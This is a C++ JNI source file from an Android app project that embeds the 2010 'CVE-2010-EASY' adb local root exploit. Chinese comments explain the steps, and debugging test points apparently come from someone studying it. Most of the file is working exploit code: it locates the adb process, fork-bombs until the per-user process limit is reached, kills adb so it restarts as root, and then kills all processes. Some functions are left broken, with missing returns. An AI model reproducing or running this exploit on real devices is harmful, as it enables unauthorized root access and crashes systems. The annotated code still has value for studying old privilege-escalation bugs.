#include <jni.h>
#include <string>

#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>

void die(const char *msg)
{
    perror(msg);
    //将上一个函数发生错误的原因输出到标准设备，参数msg所指的字符串会先打印出
    //此错误原因依照全局变量errno(宏，返回左值)的值来决定要输出的字符串
    exit(errno);
    //exit(0) 表示程序正常, exit(1)/exit(-1)表示程序异常退
    //exit() 结束当前进程/当前程序/
}

pid_t find_adb() {
    char buf[256];
    int i = 0, fd = 0;
    pid_t found = 0;

    for(i = 0; i < 32000; ++i) {
        sprintf(buf, "/proc/%d/cmdline", i);
        if((fd = open(buf, O_RDONLY)) < 0) {
            continue;
        }
        memset(buf, 0, sizeof(buf));
        read(fd, buf, sizeof(buf) - 1);
/*
定义函数：ssize_t read(int fd, void * buf, size_t count);

函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.
若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数,
如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
*/
        close(fd);
        if(strstr(buf,"/sbin/adb")) {
            found = i;
            break;
        }
    }
    return found;
}

void restart_adb(pid_t pid) {
    kill(pid,9);
}

void wait_for_root_adb(pid_t old_adb)
{
    pid_t p = 0;

    for (;;) {
        p = find_adb();
        if (p != 0 && p != old_adb)
            break;
        sleep(1);
    }
    sleep(5);
    kill(-1, 9);
}

void out() {
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) {

    atexit(out);

    pid_t adb_pid = 0, p;
    int pids = 0, new_pids = 1;
    int pepe[2];
    char c = 0;
    struct rlimit rl;//在Linux下的进程资源的限制（struct rlimit）

    printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
    printf("[*] checking NPROC limit ...\n");

    if (getrlimit(RLIMIT_NPROC, &rl) < 0)//首先获取了RLIMIT_NPROC的值，这个值是linux内核中定义的每个用户可以运行的最大进程数
        die("[-] getrlimit");

    //测试点1
    //成功

    if (rl.rlim_cur == RLIM_INFINITY) {
        printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
        exit(1);
    }

    printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
    printf("[*] Searching for adb ...\n");

    adb_pid = find_adb();
    //调用find_adb()函数来搜索Android系统中adb进程的PID。该函数读取每个进程对应的文件的/proc/<pid>/cmdline，根据其是否等于”/sbin/adb”来判断是否adb进程

    //测试点2
    //成功

    if (!adb_pid)
        die("[-] Cannot find adb");

    printf("[+] Found adb as PID %d\n", adb_pid);
    printf("[*] Spawning children. Dont type anything and wait for reset!\n");
    printf("[*]\n[*] If you like what we are doing you can send us PayPal money to\n"
                   "[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"
                   "[*] If you are a company and feel like you profit from our work,\n"
                   "[*] we also accept donations > 1000 USD!\n");
    printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");

    sleep(5);

    //测试点4
    //成功

    if (fork() > 0){//fork了一个新的进程，父进程退出，而子进程继续
        exit(0);
    }
    /* 在测试点1-5测试返回hello from c++
     * 测试结果：
     * fork()正常，返回hello from c++
     * exit(0)之后出错，程序可以正常打开，白板一块
     */


    //测试点5
    //失败

    setsid();
    pipe(pepe);//创建一个管道

    //测试点3
    //失败


    /* generate many (zombie) shell-user processes so restarting
     * adb's setuid() will fail.
     * The whole thing is a bit racy, since when we kill adb
     * there is one more process slot left which we need to
     * fill before adb reaches setuid(). Thats why we fork-bomb
     * in a seprate process.
     */
    if (fork() == 0) {//重头戏
        close(pepe[0]);
        for (;;) {
            if ((p = fork()) == 0) {
                //新建一个进程后，
                // 在子进程中，exploit代码不断地fork(),而新的进程不断退出，
                // 从而产生大量的僵尸进程（占据shell用户的进程数）
                // 最终，进程数达到上限，fork()返回小于0
                exit(0);
            }
            else if (p < 0) {
                if (new_pids) {
                    printf("\n[+] Forked %d childs.\n", pids);
                    new_pids = 0;
                    write(pepe[1], &c, 1);//于是打印当前已经创建多少进程，并向管道输入一个字符
                    close(pepe[1]);//管道的作用是和(:122)fork出来的父进程同步，该进程在141行read这一管道，因而阻塞直至僵尸进程已经达到上限(:131)
                }
            }
            else {
                ++pids;
            }
        }
    }

    //测试点6
    //注释掉exit(0)后
    //成功

//进一步的，exploit杀掉adb进程，并在系统检测到这一现象并重启一个adb之前，再一次fork()，将前一个adb留下的进程空位占据
    close(pepe[1]);
    read(pepe[0], &c, 1);

    //测试点8
    //注释掉exit(0)后
    //失败，应用不能打开

    restart_adb(adb_pid);

    //测试点9
    //注释掉exit(0)后
    //失败，应用不能打开

    if (fork() == 0) {
        fork();
        for (;;)
            sleep(0x743C);
    }

    //测试点7
    //注释掉exit(0)后
    //失败

    wait_for_root_adb(adb_pid);//exploit调用wait_for_root_adb()，等待系统重启一个adb，这个新建的adb就会具有root权限
    int result;
    result = setsid();
    std::string ss = "root successfully!";
    char tmp[256];
    sprintf(tmp,"%d",result);
    ss = tmp;
//    return env->NewStringUTF(ss.c_str());
//失败

}


JNIEXPORT jstring JNICALL
Java_com_example_zgd_result_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}

JNIEXPORT jstring JNICALL
Java_com_example_zgd_result_MainActivity_test(JNIEnv *env, jobject instance) {

    int r = 123;
    std::string ss;
//    ss = (std::string) (r);
    return env->NewStringUTF(ss.c_str());
}